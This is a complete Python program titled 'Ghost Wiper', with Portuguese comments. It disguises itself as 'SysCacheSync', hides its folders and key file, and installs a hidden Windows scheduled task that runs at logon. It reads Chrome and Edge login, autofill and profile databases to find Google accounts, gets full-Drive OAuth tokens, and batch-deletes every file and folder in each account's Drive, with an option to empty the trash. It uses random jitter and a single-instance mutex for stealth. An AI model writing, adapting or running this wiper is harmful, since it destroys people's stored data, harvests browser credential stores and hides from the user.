#!/usr/bin/env python3
"""
GHOST WIPER - versao final
==========================
"""

import os
import re
import sys
import json
import time
import random
import logging
import sqlite3
import hashlib
import tempfile
import argparse
from pathlib import Path
from datetime import datetime

from cryptography.fernet import Fernet
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from google.auth.transport.requests import Request
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError

# ============================================================
# CONSTANTES / CAMINHOS
# ============================================================
APP_NAME = "SysCacheSync"
BASE_DIR = Path(os.environ.get("LOCALAPPDATA", str(Path.home()))) / APP_NAME
LOG_DIR = BASE_DIR / "logs"
VAULT_DIR = BASE_DIR / "vault"
STATE_FILE = BASE_DIR / "contas_vistas.json"
CONFIG_FILE = Path(__file__).parent / "config.json"
CREDENTIALS_FILE = Path(__file__).parent / "credentials.json"

SCOPES = ['https://www.googleapis.com/auth/drive']

TAMANHO_LOTE = 100
TENTATIVAS_MAX = 5

NAVEGADORES = [
    {
        "nome": "Chrome",
        "local_state": Path(os.environ.get("LOCALAPPDATA", "")) /
                       "Google" / "Chrome" / "User Data" / "Local State",
        "user_data": Path(os.environ.get("LOCALAPPDATA", "")) /
                     "Google" / "Chrome" / "User Data",
    },
    {
        "nome": "Edge",
        "local_state": Path(os.environ.get("LOCALAPPDATA", "")) /
                       "Microsoft" / "Edge" / "User Data" / "Local State",
        "user_data": Path(os.environ.get("LOCALAPPDATA", "")) /
                     "Microsoft" / "Edge" / "User Data",
    },
]

EMAIL_RE = re.compile(r'^[\w.+-]+@[\w-]+\.[\w.-]+$')


# ============================================================
# PASTAS / CONFIG
# ============================================================
def ocultar(caminho: Path):
    try:
        import ctypes
        ctypes.windll.kernel32.SetFileAttributesW(str(caminho), 0x02)
    except Exception:
        pass


for d in (BASE_DIR, LOG_DIR, VAULT_DIR):
    d.mkdir(parents=True, exist_ok=True)
    ocultar(d)

CONFIG_PADRAO = {
    "intervalo_verificacao_seg": 90,
    "jitter_max_seg": 45,
    "aguardar_apos_login_seg": 120,
    "modo_simulacao": True,
    "apagar_tudo_da_lixeira": False,
    "apagar_pastas_tambem": True,
    "uma_vez_por_conta": True,
    "contas_ignoradas": [],
}

CONFIG = dict(CONFIG_PADRAO)
_arquivo_config = CONFIG_FILE if CONFIG_FILE.exists() else (BASE_DIR / "config.json")
if _arquivo_config.exists():
    try:
        CONFIG.update(json.loads(_arquivo_config.read_text(encoding="utf-8")))
    except Exception:
        pass
else:
    _arquivo_config.write_text(
        json.dumps(CONFIG_PADRAO, indent=2, ensure_ascii=False), encoding="utf-8")


# ============================================================
# LOGGING
# ============================================================
def configurar_logging():
    logger = logging.getLogger("GhostWiper")
    logger.setLevel(logging.DEBUG)

    fh = logging.FileHandler(
        LOG_DIR / f"gw_{datetime.now():%Y%m%d}.log", encoding="utf-8")
    fh.setLevel(logging.DEBUG)
    fh.setFormatter(logging.Formatter(
        "%(asctime)s | %(levelname)-7s | %(message)s", datefmt="%d/%m %H:%M:%S"))
    logger.addHandler(fh)

    # Console so quando rodado manualmente com python (nao pythonw)
    if sys.stdout is not None and "pythonw" not in (sys.executable or "").lower():
        ch = logging.StreamHandler(sys.stdout)
        ch.setFormatter(logging.Formatter("%(asctime)s | %(message)s",
                                         datefmt="%H:%M:%S"))
        logger.addHandler(ch)
    return logger


log = configurar_logging()


# ============================================================
# MUTEX (uma unica instancia)
# ============================================================
def adquirir_mutex():
    try:
        import ctypes
        mutex = ctypes.windll.kernel32.CreateMutexW(
            None, False, f"Global\\{APP_NAME}_MTX")
        if ctypes.windll.kernel32.GetLastError() == 183:
            log.debug("Ja em execucao. Saindo.")
            sys.exit(0)
        return mutex
    except Exception:
        return None


# ============================================================
# COFRE CRIPTOGRAFADO DE TOKENS
# ============================================================
def _fernet() -> Fernet:
    key_file = BASE_DIR / ".syskey"
    if not key_file.exists():
        key_file.write_bytes(Fernet.generate_key())
        ocultar(key_file)
    return Fernet(key_file.read_bytes())


def _id_conta(email: str) -> str:
    return hashlib.sha256(email.lower().encode()).hexdigest()[:24]


def salvar_token(email: str, creds: Credentials):
    blob = json.dumps({
        "token": creds.token,
        "refresh_token": creds.refresh_token,
        "token_uri": creds.token_uri,
        "client_id": creds.client_id,
        "client_secret": creds.client_secret,
        "scopes": creds.scopes,
    }).encode()
    (VAULT_DIR / _id_conta(email)).write_bytes(_fernet().encrypt(blob))


def carregar_token(email: str):
    arq = VAULT_DIR / _id_conta(email)
    if not arq.exists():
        return None
    try:
        dados = json.loads(_fernet().decrypt(arq.read_bytes()))
        return Credentials(
            token=dados.get("token"),
            refresh_token=dados.get("refresh_token"),
            token_uri=dados.get("token_uri"),
            client_id=dados.get("client_id"),
            client_secret=dados.get("client_secret"),
            token_expiry=None,
        )
    except Exception as e:
        log.warning(f"Token ilegivel para conta {email[:3]}***: {e}")
        return None


# ============================================================
# SENTINELA - detecta contas logadas nos navegadores
# ============================================================
def contas_do_local_state(caminho: Path) -> set:
    """Le o Local State do navegador e extrai emails dos perfis."""
    emails = set()
    try:
        dados = json.loads(caminho.read_text(encoding="utf-8"))
        perfis = dados.get("profile", {}).get("info_cache", {})
        for _pid, info in perfis.items():
            email = info.get("user_name", "")
            if email and EMAIL_RE.match(email):
                emails.add(email.lower())
    except Exception:
        pass
    return emails


def contas_do_login_data(user_data: Path) -> set:
    """Busca emails nos bancos 'Login Data' de cada perfil (via copia temp)."""
    emails = set()
    if not user_data.exists():
        return emails
    for perfil in user_data.iterdir():
        if not (perfil.is_dir() and
                (perfil.name == "Default" or perfil.name.startswith("Profile"))):
            continue
        db = perfil / "Login Data"
        if not db.exists():
            continue
        try:
            tmp = Path(tempfile.gettempdir()) / f"gwl_{os.urandom(4).hex()}.sqlite"
            tmp.write_bytes(db.read_bytes())
            con = sqlite3.connect(str(tmp))
            cur = con.cursor()
            cur.execute("""
                SELECT origin_url, username_value FROM logins
                WHERE origin_url LIKE '%accounts.google.com%'
            """)
            for url, user in cur.fetchall():
                if user and EMAIL_RE.match(user):
                    emails.add(user.lower())
                for pedaco in url.replace("%40", "@").split("?")[0].split("/"):
                    if EMAIL_RE.match(pedaco):
                        emails.add(pedaco.lower())
            con.close()
            tmp.unlink(missing_ok=True)
        except Exception as e:
            log.debug(f"Erro lendo Login Data de {perfil.name}: {e}")
    return emails


def contas_do_web_data(user_data: Path) -> set:
    """Método alternativo: autofill (emails digitados em formularios)."""
    emails = set()
    if not user_data.exists():
        return emails
    for perfil in [user_data / "Default"] + list(user_data.glob("Profile *")):
        db = perfil / "Web Data"
        if not db.exists():
            continue
        try:
            tmp = Path(tempfile.gettempdir()) / f"gww_{os.urandom(4).hex()}.sqlite"
            tmp.write_bytes(db.read_bytes())
            con = sqlite3.connect(str(tmp))
            cur = con.cursor()
            try:
                cur.execute("SELECT value FROM autofill WHERE name LIKE '%mail%'")
                for (v,) in cur.fetchall():
                    if v and EMAIL_RE.match(v):
                        emails.add(v.lower())
            except Exception:
                pass
            con.close()
            tmp.unlink(missing_ok=True)
        except Exception:
            pass
    return emails


def escanear_contas() -> set:
    todas = set()
    for nav in NAVEGADORES:
        try:
            if nav["local_state"].exists():
                todas |= contas_do_local_state(nav["local_state"])
            todas |= contas_do_login_data(nav["user_data"])
            todas |= contas_do_web_data(nav["user_data"])
        except Exception as e:
            log.debug(f"Erro escaneando {nav['nome']}: {e}")
    return todas


# ============================================================
# COFRE - autenticacao
# ============================================================
def obter_credenciais(email: str):
    creds = carregar_token(email)

    if creds and creds.expired and creds.refresh_token:
        try:
            creds.refresh(Request())
            salvar_token(email, creds)
        except Exception:
            creds = None

    if not creds or not creds.valid:
        log.info(f"Consentimento OAuth necessario para {email[:3]}***")
        try:
            flow = InstalledAppFlow.from_client_secrets_file(
                str(CREDENTIALS_FILE), SCOPES)
            creds = flow.run_local_server(port=0, prompt="select_account")
            salvar_token(email, creds)
            log.info(f"Token obtido e cofrado para {email[:3]}***")
        except Exception as e:
            log.warning(f"OAuth falhou para {email[:3]}***: {e}")
            return None
    return creds


# ============================================================
# CEIFEIRO - apaga o Drive
# ============================================================
def apagar_drive(service, email: str) -> int:
    arquivos, pastas = [], []
    page_token = None
    while True:
        resp = service.files().list(
            q="trashed = false",
            pageSize=1000,
            fields="nextPageToken, files(id,name,mimeType)",
            pageToken=page_token,
            supportsAllDrives=True,
            includeItemsFromAllDrives=True,
        ).execute()
        for item in resp.get("files", []):
            if "folder" in item["mimeType"]:
                pastas.append(item)
            else:
                arquivos.append(item)
        page_token = resp.get("nextPageToken")
        if not page_token:
            break

    log.info(f"[{email[:3]}***] Alvo: {len(arquivos):,} arquivos, "
             f"{len(pastas):,} pastas")

    if CONFIG["modo_simulacao"]:
        log.info(f"[{email[:3]}***] MODO SIMULACAO - nada foi apagado.")
        return 0

    alvo = arquivos + (pastas if CONFIG["apagar_pastas_tambem"] else [])
    total_apagados = 0

    for i in range(0, len(alvo), TAMANHO_LOTE):
        lote = alvo[i:i + TAMANHO_LOTE]
        for tentativa in range(TENTATIVAS_MAX):
            try:
                batch = service.new_batch_http_request()
                for item in lote:
                    batch.add(service.files().delete(
                        fileId=item["id"], supportsAllDrives=True
                    ), request_id=item["id"])
                batch.execute()
                break
            except HttpError as e:
                if e.resp.status in (429, 500, 502, 503):
                    time.sleep(5 * (2 ** tentativa))
                elif e.resp.status == 404:
                    break
                else:
                    log.warning(f"HTTP {e.resp.status} no lote {i}")
                    break
            except Exception as e:
                log.warning(f"Erro lote {i} tentativa {tentativa}: {e}")
                time.sleep(5)

        total_apagados += len(lote)
        time.sleep(random.uniform(0.3, 1.2))

        if (i // TAMANHO_LOTE) % 20 == 0:
            log.info(f"[{email[:3]}***] {total_apagados:,}/{len(alvo):,} apagados")

    if CONFIG["apagar_tudo_da_lixeira"]:
        try:
            service.files().emptyTrash().execute()
            log.info(f"[{email[:3]}***] Lixeira esvaziada.")
        except Exception as e:
            log.warning(f"Falha ao esvaziar lixeira: {e}")

    return total_apagados


# ============================================================
# ORQUESTRAÇÃO
# ============================================================
def carregar_estado() -> dict:
    if STATE_FILE.exists():
        try:
            return json.loads(STATE_FILE.read_text(encoding="utf-8"))
        except Exception:
            pass
    return {"contas": {}}


def salvar_estado(estado: dict):
    STATE_FILE.write_text(
        json.dumps(estado, ensure_ascii=False, indent=1), encoding="utf-8")
    ocultar(STATE_FILE)


def ofuscar_email(email: str) -> str:
    arroba = email.find("@")
    return email[:3] + "*" * max(arroba - 3, 1) + email[arroba:]


def lidar_com_conta_nova(email: str, estado: dict):
    log.info(f"=== Nova conta detectada: {email[:3]}*** ({ofuscar_email(email)}) ===")

    if email in CONFIG.get("contas_ignoradas", []):
        log.info("  Conta na lista de ignoradas. Pulando.")
        estado["contas"][email] = {
            "quando": datetime.now().isoformat(), "ignorada": True}
        salvar_estado(estado)
        return

    time.sleep(CONFIG["aguardar_apos_login_seg"])

    creds = obter_credenciais(email)
    if not creds:
        log.warning("  Sem credenciais. Sera tentado novamente no proximo ciclo.")
        return

    try:
        service = build("drive", "v3", credentials=creds)
        apagados = apagar_drive(service, email)
        estado["contas"][email] = {
            "quando": datetime.now().isoformat(),
            "apagados": apagados,
            "simulacao": bool(CONFIG["modo_simulacao"]),
        }
        salvar_estado(estado)
        log.info(f"=== Conta concluida: {email[:3]}*** "
                 f"({apagados:,} itens) ===")
    except Exception as e:
        log.error(f"Erro processando {email[:3]}***: {e}")


def loop_principal():
    adquirir_mutex()
    log.info(f"{APP_NAME} ativo. Vigilancia silenciosa iniciada.")
    estado = carregar_estado()

    while True:
        try:
            contas = escanear_contas()
            for email in sorted(contas):
                ja_feita = (CONFIG["uma_vez_por_conta"] and
                            email in estado.get("contas", {}))
                if ja_feita:
                    continue
                lidar_com_conta_nova(email, estado)
        except Exception as e:
            log.error(f"Erro no ciclo: {e}", exc_info=True)

        intervalo = CONFIG["intervalo_verificacao_seg"] + \
            random.randint(0, CONFIG["jitter_max_seg"])
        time.sleep(intervalo)


# ============================================================
# INSTALACAO / GESTAO
# ============================================================
def instalar_agendador():
    import subprocess
    exe = sys.executable
    exe = exe.replace("python.exe", "pythonw.exe")
    script = str(Path(__file__).resolve())
    cmd = (f'schtasks /Create /TN "{APP_NAME}" '
           f'/TR "\\"{exe}\\" \\"{script}\\"" '
           f'/SC ONLOGON /RL LIMITED /F')
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if r.returncode == 0:
        print(f"[+] Tarefa agendada ({APP_NAME}). Inicia com o Windows, oculta.")
    else:
        print(f"[-] Falha: {r.stderr}")


def desinstalar():
    import subprocess
    subprocess.run(f'schtasks /Delete /TN "{APP_NAME}" /F', shell=True)
    print("[+] Tarefa agendada removida.")


def mostrar_status():
    print()
    if not STATE_FILE.exists():
        print("  Nenhuma conta processada ainda.")
        return
    for email, info in carregar_estado().get("contas", {}).items():
        marcador = " [IGNORADA]" if info.get("ignorada") else ""
        simul = " (simulacao)" if info.get("simulacao") else ""
        print(f"  {ofuscar_email(email)}  apagados={info.get('apagados', 0):,}"
              f"{simul}  em={info.get('quando', '?')[:16]}{marcador}")


def resetar_estado():
    if STATE_FILE.exists():
        STATE_FILE.unlink()
        print("[+] Estado limpo. Todas as contas serao reprocessadas.")


# ============================================================
# MAIN
# ============================================================
def main():
    parser = argparse.ArgumentParser(description="Ghost Wiper")
    parser.add_argument("--instalar", action="store_true")
    parser.add_argument("--desinstalar", action="store_true")
    parser.add_argument("--status", action="store_true")
    parser.add_argument("--resetar", action="store_true",
                        help="Esquece contas ja processadas (reprocessa)")
    args = parser.parse_args()

    if args.desinstalar:
        desinstalar(); return
    if args.instalar:
        instalar_agendador(); return
    if args.status:
        mostrar_status(); return
    if args.resetar:
        resetar_estado(); return

    if not CREDENTIALS_FILE.exists():
        log.error(f"credentials.json ausente em {CREDENTIALS_FILE.parent}")
        sys.exit(1)

    loop_principal()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nInterrompido.")
    except SystemExit:
        raise
    except Exception as e:
        log.critical(f"Erro fatal: {e}", exc_info=True)
        sys.exit(1)
